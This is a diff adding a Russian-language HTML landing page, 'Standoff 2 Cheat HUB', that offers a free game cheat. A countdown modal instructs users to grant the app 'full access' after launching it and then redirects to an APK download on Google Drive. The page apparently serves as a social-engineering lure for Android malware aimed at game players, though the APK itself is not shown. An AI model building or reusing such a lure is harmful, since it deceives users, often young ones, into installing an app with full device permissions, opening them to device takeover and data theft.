@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Standoff 2 Cheat HUB</title>
+  <style>
+    body {
+      background: #0f0f0f;
+      color: #f2f2f2;
+      font-family: 'Segoe UI', sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: auto;
+      background: #1a1a1a;
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
+    }
+
+    h1 {
+      color: #00ffcc;
+      margin-bottom: 20px;
+    }
+
+    p {
+      color: #bbbbbb;
+      font-size: 16px;
+    }
+
+    .download-btn {
+      display: inline-block;
+      margin-top: 30px;
+      padding: 15px 30px;
+      background-color: #00cc99;
+      color: #fff;
+      border-radius: 10px;
+      font-weight: bold;
+      font-size: 16px;
+      text-decoration: none;
+      transition: background-color 0.3s ease;
+      cursor: pointer;
+    }
+
+    .download-btn:hover {
+      background-color: #00b386;
+    }
+
+    /* Modal styles */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 10;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.7);
+    }
+
+    .modal-content {
+      background-color: #1a1a1a;
+      margin: 15% auto;
+      padding: 30px;
+      border-radius: 15px;
+      width: 80%;
+      max-width: 400px;
+      color: #fff;
+      text-align: center;
+      box-shadow: 0 0 20px #00ffcc;
+    }
+
+    .modal-content p {
+      margin-bottom: 20px;
+    }
+
+    #confirmBtn {
+      background-color: #00cc99;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: bold;
+      cursor: not-allowed;
+      opacity: 0.6;
+    }
+
+    #confirmBtn.enabled {
+      cursor: pointer;
+      opacity: 1;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Standoff 2 Cheat HUB</h1>
+    <p>Добро пожаловать в приватный хаб читов для Standoff 2.<br>
+       Здесь ты можешь скачать последнюю версию чита и получить доступ к обновлениям.</p>
+
+    <!-- Кнопка скачивания вызывает модальное окно -->
+    <span class="download-btn" onclick="showModal()">Скачать чит</span>
+  </div>
+
+  <!-- Модальное окно -->
+  <div id="infoModal" class="modal">
+    <div class="modal-content">
+      <p>
+        ⚠️ <strong>Уведомление:</strong><br>
+        <!-- Твой текст здесь -->
+        После запуска чита ОБЯЗАТЕЛЬНО дайте полный доступ, ИНАЧЕ ЧИТ-МЕНЮ НЕ БУДЕТ ОТОБРАЖАТСЯ!
+      </p>
+      <button id="confirmBtn" disabled>Подождите 10 секунд...</button>
+    </div>
+  </div>
+
+  <script>
+    function showModal() {
+      document.getElementById('infoModal').style.display = 'block';
+      let btn = document.getElementById('confirmBtn');
+      let seconds = 10;
+      btn.innerText = `Подождите ${seconds} секунд...`;
+      btn.classList.remove('enabled');
+
+      let countdown = setInterval(() => {
+        seconds--;
+        if (seconds > 0) {
+          btn.innerText = `Подождите ${seconds} секунд...`;
+        } else {
+          clearInterval(countdown);
+          btn.innerText = "Я понял";
+          btn.disabled = false;
+          btn.classList.add('enabled');
+          btn.onclick = () => {
+            window.location.href = "https://drive.google.com/uc?export=download&id=1LyQIFADCeZzLq-yg59VzpOyMp7IIkCLy"; // сюда вставь ссылку на apk
+          };
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
